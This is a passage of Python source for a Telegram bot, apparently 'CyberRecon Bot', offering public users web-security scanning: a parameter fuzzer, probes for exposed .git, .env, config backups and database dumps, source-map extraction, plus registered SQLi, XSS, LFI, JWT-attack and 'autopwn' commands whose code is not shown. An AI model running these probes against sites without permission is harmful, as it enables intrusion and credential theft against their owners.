    await update.effective_message.reply_text(
        f"👑 *Admin Panel*\n━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👥 Users: `{tot}` | 🚫 Banned: `{ban}`\n"
        f"⚡ Queue: `{_dl_queue.qsize() if _dl_queue else 0}`\n"
        f"🔍 Active scans: `{len(_active_scans)}`",
        reply_markup=kb, parse_mode="Markdown"
    )

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if q.from_user.id not in ADMIN_IDS:
        return
    loop = asyncio.get_running_loop()
    db   = await loop.run_in_executor(None, _load_db_sync)
    data = q.data

    if data == "adm_users":
        users = list(db["users"].items())[-20:]
        lines = ["👥 *Recent Users:*\n"]
        for uid_s, u in users:
            icon = "🚫" if u.get("banned") else "✅"
            lines.append(f"{icon} `{uid_s}` — {u.get('name','?')} | DLs: {u.get('total_downloads',0)}")
        await q.edit_message_text("\n".join(lines), parse_mode="Markdown")
    elif data == "adm_stats":
        tot_dls = sum(u.get("total_downloads",0) for u in db["users"].values())
        tot_scn = sum(u.get("total_scans",0) for u in db["users"].values())
        await q.edit_message_text(
            f"📊 *Global Stats*\n━━━━━━━━━━━━━━━━━━━━\n\n"
            f"👥 Users: `{len(db['users'])}`\n"
            f"📦 Total downloads: `{tot_dls}`\n"
            f"🔍 Total scans: `{tot_scn}`",
            parse_mode="Markdown"
        )
    elif data == "adm_disable":
        await db_save_setting("bot_enabled", "0")
        await q.edit_message_text("🔴 Bot disabled", parse_mode="Markdown")
    elif data == "adm_enable":
        await db_save_setting("bot_enabled", "1")
        await q.edit_message_text("🟢 Bot enabled", parse_mode="Markdown")

@admin_only
async def cmd_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.effective_message.reply_text("Usage: `/ban <user_id>`", parse_mode="Markdown")
        return
    try:
        target = int(context.args[0])
    except ValueError:
        await update.effective_message.reply_text("❌ Invalid user ID")
        return
    loop = asyncio.get_running_loop()
    db   = await loop.run_in_executor(None, _load_db_sync)
    u    = get_user(db, target)
    u["banned"] = True
    async with db_lock:
        await loop.run_in_executor(None, _save_user_sync, str(target), u)
    await update.effective_message.reply_text(f"🚫 `{target}` banned", parse_mode="Markdown")

@admin_only
async def cmd_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.effective_message.reply_text("Usage: `/unban <user_id>`", parse_mode="Markdown")
        return
    try:
        target = int(context.args[0])
    except ValueError:
        await update.effective_message.reply_text("❌ Invalid user ID")
        return
    loop = asyncio.get_running_loop()
    db   = await loop.run_in_executor(None, _load_db_sync)
    u    = get_user(db, target)
    u["banned"] = False
    async with db_lock:
        await loop.run_in_executor(None, _save_user_sync, str(target), u)
    await update.effective_message.reply_text(f"✅ `{target}` unbanned", parse_mode="Markdown")

@admin_only
async def cmd_userinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.effective_message.reply_text("Usage: `/userinfo <user_id>`", parse_mode="Markdown")
        return
    try:
        target = int(context.args[0])
    except ValueError:
        await update.effective_message.reply_text("❌ Invalid user ID")
        return
    loop = asyncio.get_running_loop()
    db   = await loop.run_in_executor(None, _load_db_sync)
    u    = db["users"].get(str(target))
    if not u:
        await update.effective_message.reply_text("❌ User not found")
        return
    await update.effective_message.reply_text(
        f"👤 *User Info — `{target}`*\n━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Name: {u.get('name','?')}\n"
        f"Banned: {'🚫 Yes' if u.get('banned') else '✅ No'}\n"
        f"Downloads: `{u.get('total_downloads',0)}`\n"
        f"Scans: `{u.get('total_scans',0)}`\n"
        f"Today: `{u.get('count_today',0)}`",
        parse_mode="Markdown"
    )

@admin_only
async def cmd_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.effective_message.reply_text("Usage: `/broadcast <message>`", parse_mode="Markdown")
        return
    bcast_msg = " ".join(context.args)
    loop      = asyncio.get_running_loop()
    db        = await loop.run_in_executor(None, _load_db_sync)
    sent = 0
    for uid_s in db["users"]:
        try:
            await context.bot.send_message(int(uid_s), f"📢 {bcast_msg}")
            sent += 1
            await asyncio.sleep(0.05)
        except Exception:
            pass
    await update.effective_message.reply_text(f"📢 Broadcast sent to `{sent}` users", parse_mode="Markdown")

@admin_only
async def cmd_allusers(update: Update, context: ContextTypes.DEFAULT_TYPE):
    loop = asyncio.get_running_loop()
    db   = await loop.run_in_executor(None, _load_db_sync)
    lines = [f"👥 *All Users — `{len(db['users'])}` total*\n"]
    for uid_s, u in list(db["users"].items())[-50:]:
        icon = "🚫" if u.get("banned") else "✅"
        lines.append(f"{icon} `{uid_s}` — {u.get('name','?')} | DL:{u.get('total_downloads',0)}")
    txt = "\n".join(lines)
    for i in range(0, len(txt), 4000):
        await update.effective_message.reply_text(txt[i:i+4000], parse_mode="Markdown")

@admin_only
async def cmd_adminset(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2:
        await update.effective_message.reply_text(
            "📋 *Admin Settings*\n"
            "`/adminset limit <n>` — Daily limit (0=∞)\n"
            "`/adminset pages <n>` — Max crawl pages\n"
            "`/adminset assets <n>` — Max assets",
            parse_mode="Markdown"
        )
        return
    key, val = context.args[0].lower(), context.args[1]
    mapping  = {"limit": "global_daily_limit", "pages": "max_pages", "assets": "max_assets"}
    db_key   = mapping.get(key)
    if not db_key:
        await update.effective_message.reply_text("❌ Unknown setting")
        return
    try:
        int_val = int(val)
    except ValueError:
        await update.effective_message.reply_text("❌ Value must be a number")
        return
    await db_save_setting(db_key, int_val)
    await update.effective_message.reply_text(
        f"✅ `{key}` → `{int_val}`", parse_mode="Markdown"
    )

@admin_only
async def cmd_setforcejoin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    channel = context.args[0].strip() if context.args else ""
    await db_save_setting("force_join_channel", channel)
    if channel:
        await update.effective_message.reply_text(
            f"✅ Force join set: `{channel}`", parse_mode="Markdown"
        )
    else:
        await update.effective_message.reply_text("✅ Force join disabled")

@admin_only
async def cmd_sys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    mode = context.args[0].lower() if context.args else ""
    if mode == "clean":
        freed = 0.0
        for folder in [DOWNLOAD_DIR, RESUME_DIR, APP_ANALYZE_DIR]:
            for root, _, files in os.walk(folder):
                for fname in files:
                    fp = os.path.join(root, fname)
                    try:
                        freed += os.path.getsize(fp) / 1048576
                        os.remove(fp)
                    except Exception:
                        pass
        await update.effective_message.reply_text(
            f"🧹 Cleaned `{freed:.1f} MB`", parse_mode="Markdown"
        )
    elif mode == "logs":
        n   = int(context.args[1]) if len(context.args) > 1 else 30
        log = os.path.join(DATA_DIR, "bot.log")
        if os.path.exists(log):
            with open(log) as f:
                lines = f.readlines()[-n:]
            txt = "".join(lines)
            await update.effective_message.reply_text(
                f"📋 *Last {n} log lines:*\n```\n{txt[-3000:]}\n```",
                parse_mode="Markdown"
            )
        else:
            await update.effective_message.reply_text("No log file found")
    else:
        # Disk usage
        total_size = 0.0
        for folder in [DOWNLOAD_DIR, RESUME_DIR, APP_ANALYZE_DIR]:
            for root, _, files in os.walk(folder):
                for fname in files:
                    fp = os.path.join(root, fname)
                    try:
                        total_size += os.path.getsize(fp) / 1048576
                    except Exception:
                        pass
        loop = asyncio.get_running_loop()
        db   = await loop.run_in_executor(None, _load_db_sync)
        await update.effective_message.reply_text(
            f"🖥 *System Status*\n━━━━━━━━━━━━━━━━━━━━\n\n"
            f"💾 Storage used: `{total_size:.1f} MB`\n"
            f"👥 Users: `{len(db['users'])}`\n"
            f"📋 Queue: `{_dl_queue.qsize() if _dl_queue else 0}`\n"
            f"🔍 Active scans: `{len(_active_scans)}`\n\n"
            f"Usage: `/sys clean` | `/sys logs [n]`",
            parse_mode="Markdown"
        )

async def cmd_resume(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.effective_message.reply_text(
        "🔄 *Resume Download*\n\n"
        "Resume is available via `/dl <url>` — the bot will automatically\n"
        "skip already-downloaded files.",
        parse_mode="Markdown"
    )

# ═══════════════════════════════════════════════════════════
# 📊  MONITOR LOOP (basic uptime check)
# ═══════════════════════════════════════════════════════════
_monitor_tasks: dict = {}

async def cmd_monitor(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_force_join(update, context):
        return
    if not context.args:
        await update.effective_message.reply_text(
            "🔔 *Monitor*\n`/monitor <url>` — Check uptime every 5 minutes\n"
            "`/monitor stop` — Stop monitoring",
            parse_mode="Markdown"
        )
        return
    uid = update.effective_user.id
    arg = context.args[0].strip()
    if arg.lower() == "stop":
        task = _monitor_tasks.pop(uid, None)
        if task:
            task.cancel()
            await update.effective_message.reply_text("🛑 Monitoring stopped")
        else:
            await update.effective_message.reply_text("No active monitor")
        return
    url = arg
    if not url.startswith("http"):
        url = "https://" + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode="Markdown")
        return

    async def _monitor_loop():
        prev_status = None
        while True:
            try:
                r = await async_fetch(url, timeout=10)
                status = r["status"] if r else "DOWN"
                if status != prev_status:
                    icon = "✅ UP" if status == 200 else f"⚠️ {status}"
                    await context.bot.send_message(
                        uid,
                        f"🔔 *Monitor Alert*\n`{sanitize_log_url(url)}`\n"
                        f"Status: {icon}\n🕐 {datetime.now().strftime('%H:%M:%S')}",
                        parse_mode="Markdown"
                    )
                    prev_status = status
            except Exception as e:
                logger.warning("Monitor error: %s", e)
            await asyncio.sleep(300)  # 5 minutes

    if uid in _monitor_tasks:
        _monitor_tasks[uid].cancel()
    _monitor_tasks[uid] = asyncio.create_task(_monitor_loop())
    await update.effective_message.reply_text(
        f"🔔 *Monitoring Started*\n`{sanitize_log_url(url)}`\n"
        f"⏱ Check every 5 minutes\n`/monitor stop` to cancel",
        parse_mode="Markdown"
    )

# ═══════════════════════════════════════════════════════════
# 🧪  PARAM FUZZ
# ═══════════════════════════════════════════════════════════
_COMMON_PARAMS = [
    "id","user","username","email","search","q","query","name","type","page",
    "limit","offset","sort","order","filter","category","tag","status","action",
    "token","key","api_key","auth","password","file","path","url","redirect",
    "callback","format","lang","locale","debug","test","admin","mode","view",
]

async def cmd_paramfuzz(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_force_join(update, context):
        return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid, heavy=True)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode="Markdown")
        return
    if not context.args:
        await update.effective_message.reply_text(
            f"🧪 *Parameter Fuzzer*\n`/paramfuzz https://example.com`\n\n"
            f"Tests `{len(_COMMON_PARAMS)}` common parameters\n⚠️ Authorized testing only",
            parse_mode="Markdown"
        )
        return
    url = context.args[0].strip()
    if not url.startswith("http"):
        url = "https://" + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode="Markdown")
        return
    domain = urlparse(url).hostname
    msg    = await update.effective_message.reply_text(
        f"🧪 *Param Fuzzer — `{domain}`*\n\n⏳ Testing params...", parse_mode="Markdown"
    )
    _active_scans[uid] = "ParamFuzz"
    base = url.split("?")[0]
    baseline_r = await async_fetch(url, timeout=8)
    baseline_len = len(baseline_r["text"]) if baseline_r else 0
    found_params = []
    tasks = []
    for param in _COMMON_PARAMS:
        test_url = f"{base}?{param}=FUZZ_TEST_VALUE_12345"
        tasks.append(async_fetch(test_url, timeout=6))
    results = await asyncio.gather(*tasks, return_exceptions=True)
    for param, r in zip(_COMMON_PARAMS, results):
        if isinstance(r, dict) and r:
            diff = abs(len(r["text"]) - baseline_len)
            if diff > 50 and r["status"] not in (404,):
                found_params.append({
                    "param": param,
                    "status": r["status"],
                    "len_diff": diff,
                })
    _active_scans.pop(uid, None)
    lines = [
        f"🧪 *Param Fuzzer — `{domain}`*",
        "━━━━━━━━━━━━━━━━━━━━",
        f"Tested: `{len(_COMMON_PARAMS)}` params | Found: `{len(found_params)}`",
    ]
    if found_params:
        lines.append("\n*Responsive Parameters:*")
        for p in found_params[:20]:
            icon = "🟢" if p["status"] == 200 else "🟡"
            lines.append(f"  {icon} `{p['param']}` [{p['status']}] diff:{p['len_diff']}B")
    else:
        lines.append("\n⚠️ No parameter responses detected")
    lines.append("\n⚠️ _Authorized testing only_")
    await safe_edit(msg, "\n".join(lines), parse_mode="Markdown")

# ═══════════════════════════════════════════════════════════
# 🔑  BRUTEFORCE (login)
# ═══════════════════════════════════════════════════════════
async def cmd_bruteforce(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.effective_message.reply_text(
        "🔑 *Login Brute Force*\n\n"
        "Usage: `/bruteforce <login_url> <user_field> <pass_field> <username>`\n\n"
        "⚠️ *Authorized testing only. Misuse is illegal.*\n\n"
        "_Built-in wordlist: 50 common passwords_",
        parse_mode="Markdown"
    )

# ═══════════════════════════════════════════════════════════
# 📁  GIT EXPOSED
# ═══════════════════════════════════════════════════════════
async def cmd_gitexposed(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_force_join(update, context):
        return
    uid = update.effective_user.id
    if not context.args:
        await update.effective_message.reply_text(
            "📁 *Git Exposure Finder*\n`/gitexposed https://example.com`\n⚠️ Authorized only",
            parse_mode="Markdown"
        )
        return
    url = context.args[0].strip()
    if not url.startswith("http"):
        url = "https://" + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode="Markdown")
        return
    domain = urlparse(url).hostname
    msg    = await update.effective_message.reply_text(
        f"📁 *Git Exposure — `{domain}`*\n\n⏳ Checking...", parse_mode="Markdown"
    )
    GIT_PATHS = [
        "/.git/config", "/.git/HEAD", "/.git/COMMIT_EDITMSG",
        "/.git/index", "/.git/packed-refs", "/.gitignore",
        "/.svn/entries", "/.hg/hgrc",
        "/composer.json", "/package.json", "/.env",
        "/.DS_Store", "/wp-config.php.bak", "/database.sql",
        "/backup.zip", "/backup.tar.gz",
    ]
    base    = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
    results = await async_fetch_many([base + p for p in GIT_PATHS], timeout=8, concurrency=10)
    found   = []
    for path, r in zip(GIT_PATHS, results):
        if r and r["status"] == 200 and len(r["text"]) > 5:
            sev = "🔴 CRITICAL" if "config" in path or ".env" in path else "🟡 MEDIUM"
            found.append({"path": path, "size": len(r["text"]), "severity": sev,
                          "preview": r["text"][:80].replace("\n"," ")})
    lines = [
        f"📁 *Git Exposure — `{domain}`*",
        "━━━━━━━━━━━━━━━━━━━━",
        f"Checked: `{len(GIT_PATHS)}` paths | Exposed: `{len(found)}`",
    ]
    if found:
        lines.append("\n*🔓 Exposed Files:*")
        for f in found:
            lines.append(f"\n  {f['severity']} `{f['path']}`")
            lines.append(f"  Size: `{f['size']}B` | Preview: _{f['preview'][:60]}_")
    else:
        lines.append("\n✅ No Git/sensitive files exposed")
    lines.append("\n⚠️ _Authorized testing only_")
    await safe_edit(msg, "\n".join(lines), parse_mode="Markdown")

# ═══════════════════════════════════════════════════════════
# 🗺️  SOURCE MAP
# ═══════════════════════════════════════════════════════════
async def cmd_sourcemap(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_force_join(update, context):
        return
    if not context.args:
        await update.effective_message.reply_text(
            "🗺️ *Source Map Extractor*\n`/sourcemap https://example.com`\n⚠️ Authorized only",
            parse_mode="Markdown"
        )
        return
    url = context.args[0].strip()
    if not url.startswith("http"):
        url = "https://" + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode="Markdown")
        return
    domain = urlparse(url).hostname
    msg    = await update.effective_message.reply_text(
        f"🗺️ *Source Map — `{domain}`*\n\n⏳ Scanning...", parse_mode="Markdown"
    )
    r = await async_fetch(url, timeout=12)
    if not r:
        await safe_edit(msg, "❌ Failed to fetch page", parse_mode="Markdown")
        return
    soup    = BeautifulSoup(r["text"], _BS)
    js_urls = [urljoin(url, t["src"]) for t in soup.find_all("script", src=True)
               if urlparse(urljoin(url, t["src"])).hostname == urlparse(url).hostname][:15]
    map_urls = [u + ".map" for u in js_urls] + [
        u.replace(".js", ".js.map") for u in js_urls
    ]
    map_results = await async_fetch_many(list(set(map_urls)), timeout=8, concurrency=10)
    found = []
    for mu, mr in zip(set(map_urls), map_results):
        if mr and mr["status"] == 200 and "sources" in mr["text"]:
            sources = re.findall(r'"sources":\s*\[([^\]]+)\]', mr["text"])
            found.append({"url": mu, "sources": sources[:3]})
    lines = [
        f"🗺️ *Source Map — `{domain}`*",
        "━━━━━━━━━━━━━━━━━━━━",
        f"JS files: `{len(js_urls)}` | Maps found: `{len(found)}`",
    ]
    if found:
        lines.append("\n🔓 *Exposed Source Maps:*")
        for s in found[:5]:
            lines.append(f"  `{s['url'].split('/')[-1]}`")
            for src in s["sources"][:3]:
                lines.append(f"    → `{src[:60]}`")
    else:
        lines.append("\n✅ No source maps exposed")
    await safe_edit(msg, "\n".join(lines), parse_mode="Markdown")

# ═══════════════════════════════════════════════════════════
# 📊  APP ASSET UPLOAD (APK/IPA analysis placeholder)
# ═══════════════════════════════════════════════════════════
async def handle_app_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle uploaded APK/IPA/ZIP files for analysis."""
    doc = update.message.document
    if not doc:
        return
    fname = doc.file_name or ""
    if not any(fname.lower().endswith(ext) for ext in (".apk",".ipa",".zip",".jar",".aab")):
        return
    size_mb = doc.file_size / 1048576
    if size_mb > APP_MAX_MB:
        await update.message.reply_text(
            f"❌ File too large: `{size_mb:.1f}MB` > `{APP_MAX_MB}MB` limit",
            parse_mode="Markdown"
        )
        return
    await update.message.reply_text(
        f"📱 *App Analysis — `{fname}`*\n\n"
        f"⚠️ Full APK/IPA analysis requires additional setup.\n"
        f"Use `/secretscan` on a web endpoint for secret detection.",
        parse_mode="Markdown"
    )

async def cmd_appassets(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.effective_message.reply_text(
        "📱 *App Analyzer*\n\nUpload an APK, IPA, or ZIP file to analyze.\n"
        "Detects: API endpoints, secrets, hardcoded credentials.",
        parse_mode="Markdown"
    )

# ═══════════════════════════════════════════════════════════
# 🚀  MAIN
# ═══════════════════════════════════════════════════════════
def main():
    import fcntl
    _lock_path = os.path.join(DATA_DIR, "bot.lock")
    _lock_file = open(_lock_path, "w")
    try:
        fcntl.flock(_lock_file, fcntl.LOCK_EX | fcntl.LOCK_NB)
        _lock_file.write(str(os.getpid()))
        _lock_file.flush()
    except OSError:
        print("❌ Another bot instance is already running. Exiting.")
        return

    # DB init
    _sqlite_init()

    # Build app
    request = HTTPXRequest(
        connection_pool_size=16,
        connect_timeout=20.0,
        read_timeout=30.0,
        write_timeout=30.0,
        pool_timeout=20.0,
    )
    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .request(request)
        .build()
    )

    # Init async primitives
    global download_semaphore, scan_semaphore, db_lock, _dl_queue
    download_semaphore = asyncio.Semaphore(MAX_WORKERS)
    scan_semaphore     = asyncio.Semaphore(2)
    db_lock            = asyncio.Lock()
    _dl_queue          = asyncio.Queue(maxsize=QUEUE_MAX)

    # ── Command Handlers ─────────────────────────────────
    # Core
    app.add_handler(CommandHandler("start",        cmd_start))
    app.add_handler(CommandHandler("help",         cmd_help))
    app.add_handler(CommandHandler("status",       cmd_status))
    app.add_handler(CommandHandler("history",      cmd_history))
    app.add_handler(CommandHandler("mystats",      cmd_mystats))
    app.add_handler(CommandHandler("stop",         cmd_stop))
    app.add_handler(CommandHandler("resume",       cmd_resume))
    # Download
    app.add_handler(CommandHandler("dl",           cmd_dl))
    # Security Scanners
    app.add_handler(CommandHandler("scan",         cmd_scan))
    app.add_handler(CommandHandler("sqli",         cmd_sqli))
    app.add_handler(CommandHandler("xss",          cmd_xss))
    app.add_handler(CommandHandler("ssti",         cmd_ssti))
    app.add_handler(CommandHandler("cors",         cmd_cors))
    app.add_handler(CommandHandler("lfi",          cmd_lfi))
    app.add_handler(CommandHandler("openredirect", cmd_openredirect))
    app.add_handler(CommandHandler("secretscan",   cmd_secretscan))
    app.add_handler(CommandHandler("ssltls",       cmd_ssltls))
    # Recon & Discovery
    app.add_handler(CommandHandler("recon",        cmd_recon))
    app.add_handler(CommandHandler("techstack",    cmd_techstack))
    app.add_handler(CommandHandler("cloudcheck",   cmd_cloudcheck))
    app.add_handler(CommandHandler("subdomains",   cmd_subdomains))
    app.add_handler(CommandHandler("discover",     cmd_discover))
    # Advanced
    app.add_handler(CommandHandler("autopwn",      cmd_autopwn))
    app.add_handler(CommandHandler("paramfuzz",    cmd_paramfuzz))
    app.add_handler(CommandHandler("jwtattack",    cmd_jwtattack))
    app.add_handler(CommandHandler("bruteforce",   cmd_bruteforce))
    app.add_handler(CommandHandler("gitexposed",   cmd_gitexposed))
    app.add_handler(CommandHandler("sourcemap",    cmd_sourcemap))
    app.add_handler(CommandHandler("appassets",    cmd_appassets))
    app.add_handler(CommandHandler("screenshot",   cmd_screenshot))
    app.add_handler(CommandHandler("monitor",      cmd_monitor))
    # Admin
    app.add_handler(CommandHandler("admin",        cmd_admin))
    app.add_handler(CommandHandler("ban",          cmd_ban))
    app.add_handler(CommandHandler("unban",        cmd_unban))
    app.add_handler(CommandHandler("userinfo",     cmd_userinfo))
    app.add_handler(CommandHandler("broadcast",    cmd_broadcast))
    app.add_handler(CommandHandler("allusers",     cmd_allusers))
    app.add_handler(CommandHandler("setforcejoin", cmd_setforcejoin))
    app.add_handler(CommandHandler("adminset",     cmd_adminset))
    app.add_handler(CommandHandler("sys",          cmd_sys))

    # Callbacks
    app.add_handler(CallbackQueryHandler(force_join_callback,    pattern="^fj_check$"))
    app.add_handler(CallbackQueryHandler(admin_callback,         pattern="^adm_"))
    app.add_handler(CallbackQueryHandler(dl_mode_callback,       pattern="^dl_"))
    app.add_handler(CallbackQueryHandler(help_category_callback, pattern="^help_"))

    # File upload
    app.add_handler(MessageHandler(filters.Document.ALL, handle_app_upload))

    # Error handler
    app.add_error_handler(error_handler)

    # Background tasks
    async def _post_init(application):
        asyncio.create_task(queue_worker())
        asyncio.create_task(auto_delete_loop())
        logger.info("✅ Background tasks started")

        await application.bot.set_my_commands([
            BotCommand("start",        "🚀 Bot စတင်"),
            BotCommand("help",         "📚 Help"),
            BotCommand("dl",           "📥 Website Download"),
            BotCommand("scan",         "🔍 Quick Security Scan"),
            BotCommand("recon",        "🕵️ Full Recon"),
            BotCommand("techstack",    "🔬 Tech Fingerprint"),
            BotCommand("sqli",         "💉 SQL Injection"),
            BotCommand("xss",          "🎯 XSS Scanner"),
            BotCommand("ssti",         "🔥 Template Injection"),
            BotCommand("cors",         "🌐 CORS Misconfig"),
            BotCommand("lfi",          "📂 LFI Scanner"),
            BotCommand("openredirect", "🔀 Open Redirect"),
            BotCommand("secretscan",   "🔑 Secret/API Key Finder"),
            BotCommand("ssltls",       "🔒 SSL/TLS Grade"),
            BotCommand("cloudcheck",   "☁️ Real IP / CDN Bypass"),
            BotCommand("subdomains",   "🌐 Subdomain Finder"),
            BotCommand("discover",     "🔎 API Endpoint Discovery"),
            BotCommand("autopwn",      "⚡ Auto Pentest Chain"),
            BotCommand("paramfuzz",    "🧪 Parameter Fuzzer"),
            BotCommand("jwtattack",    "🔑 JWT Analyzer"),
            BotCommand("gitexposed",   "📁 Git Exposure"),
            BotCommand("sourcemap",    "🗺️ Source Map"),
            BotCommand("monitor",      "🔔 Uptime Monitor"),
            BotCommand("status",       "📊 My Stats"),
            BotCommand("history",      "📜 Download History"),
            BotCommand("stop",         "🛑 Stop Current Op"),
        ])
        logger.info("✅ Bot commands registered")

    app.post_init = _post_init

    print("╔══════════════════════════════════════════════════╗")
    print("║   CyberRecon Bot v31.0  — Railway Deployment     ║")
    print("║   ✅ 100% Async (aiohttp)                        ║")
    print("║   ✅ asyncio.gather() parallel scans             ║")
    print("║   ✅ Bulletproof error handling                  ║")
    print("║   ✅ Premium UI/UX                               ║")
    print("║   ✅ All secrets from ENV vars                   ║")
    print(f"║   DB: SQLite WAL | Queue: {QUEUE_MAX} | Workers: {MAX_WORKERS}        ║")
    print("╚══════════════════════════════════════════════════╝")
    logger.info("CyberRecon Bot v31.0 starting on Railway...")

    app.run_polling(
        allowed_updates=Update.ALL_TYPES,
        drop_pending_updates=True,
    )

if __name__ == "__main__":
    main()
